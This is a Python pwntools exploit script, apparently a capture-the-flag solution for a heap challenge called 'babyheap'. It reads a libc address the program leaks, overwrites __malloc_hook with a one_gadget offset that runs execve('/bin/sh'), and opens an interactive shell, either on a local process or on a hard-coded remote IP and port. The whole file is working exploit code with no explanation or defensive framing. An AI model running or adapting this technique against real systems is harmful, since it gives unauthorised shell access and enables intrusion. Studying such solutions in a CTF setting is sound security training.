from pwn import *

#context.log_level = "debug"
def add_user(size, username):
    conn.sendlineafter("exit", "1")
    conn.sendlineafter("size:", str(size))
    conn.sendafter("username:", username)

def edit_user(secure, index, username):
    conn.sendlineafter("exit", "2")
    conn.sendlineafter("edit", str(secure))
    conn.sendlineafter("index:", str(index))
    conn.sendafter("username:", username)

def ban_user(index):
    conn.sendlineafter("exit", "3")
    conn.sendlineafter("index:", str(index))

def change_name(name):
    conn.sendlineafter("exit", "4")
    conn.sendlineafter("name:", name)

def get_gift():
    conn.sendlineafter("exit", "5")
    conn.recvuntil(":\n")
    return int(conn.recvuntil("\n")[:-1])

def exploit():
    conn.sendline("A")
    #00000000000f7220 W read
    LIBC = get_gift() - 0xf7220
    log.success("LIBC :0x%x" % LIBC)
    #00000000003c4b10 V __malloc_hook
    change_name(p64(LIBC + 0x3c4b10 - 0x13))
#0x45216	execve("/bin/sh", rsp+0x30, environ)
#constraints:
#  rax == NULL
#
#0x4526a	execve("/bin/sh", rsp+0x30, environ)
#constraints:
#  [rsp+0x30] == NULL
#
#0xf0274	execve("/bin/sh", rsp+0x50, environ)
#constraints:
#  [rsp+0x50] == NULL
#
#0xf1117	execve("/bin/sh", rsp+0x70, environ)
#constraints:
#  [rsp+0x70] == NULL
    edit_user(1, 12, "A" * 0x13 + p64(LIBC + 0xf1117))
    conn.sendlineafter("exit", "1")
    conn.sendlineafter("size:", "139")
    conn.interactive()

if __name__ == "__main__":
    if len(sys.argv) > 1:
        HOST = "159.203.116.12"
        PORT = 9999
        conn = remote(HOST, PORT)
    else:
        conn = process("./babyheap", env={"LD_PRELOAD":"./libc-2.23.so"})
    exploit()
